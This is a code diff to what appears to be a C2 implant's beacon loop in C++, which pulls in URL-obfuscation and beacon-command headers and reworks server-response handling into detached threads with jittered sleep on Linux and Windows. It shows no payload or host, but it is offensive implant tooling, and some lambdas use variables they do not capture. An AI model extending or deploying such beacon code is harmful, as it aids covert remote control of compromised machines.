@@ -8,6 +8,7 @@
 #include <cstdlib> 
 #include <ctime>
 
+
 #include "config.h"
 #include "urlObfuscation.h"
 
@@ -15,8 +16,8 @@
 #define OS "Linux"
 #include "../Linux/Beacon/beacon_commands.h"
 #include "../Linux/generic.h"
-#include <thread>
 #include <chrono>
+#include <thread>
 #endif
 
 #ifdef WIN32
@@ -252,10 +253,38 @@ int beacon() {
         } else {
             try {
                 if (response_code == 200) {
-                    if (handleResponse(response_body, TIMER, ID)) {
-                        continue;
-                    }
-                }
+                    sleepTime = calculateSleepTime(TIMER, JITTER);
+                    #ifdef __unix__
+                        std::thread([response_body, sleepTime]() {
+                            sleepFor(sleepTime);
+                            if (!handleResponse(response_body, TIMER, ID)) {
+                                std::cerr << "Failed to send response" << std::endl;
+                            }
+                        }).detach();
+                    #elif _WIN32
+                        // Wrapper function for Windows thread
+                        auto threadFunc = [](LPVOID param) -> DWORD {
+                            auto data = static_cast<std::tuple<std::string, int, std::string>*>(param);
+                            const std::string& response_body = std::get<0>(*data);
+                            int sleepTime = std::get<1>(*data);
+                            const std::string& ID = std::get<2>(*data);
+                            sleepFor(sleepTime);
+                            if (!handleResponse(response_body, TIMER, ID)) {
+                                std::cerr << "Failed to send response" << std::endl;
+                            }
+                            delete data;
+                            return 0;
+                        };
+                        auto* threadData = new std::tuple<std::string, int, std::string>(response_body, sleepTime, ID);
+                        HANDLE thread = CreateThread(NULL, 0, threadFunc, threadData, 0, NULL);
+                        if (thread == NULL) {
+                            std::cerr << "Failed to create thread" << std::endl;
+                        } else {
+                            CloseHandle(thread);
+                        }
+                    #endif
+
+                }   
             } catch (const std::exception& e) {
                 std::cerr << "Exception: " << e.what() << std::endl;
             }
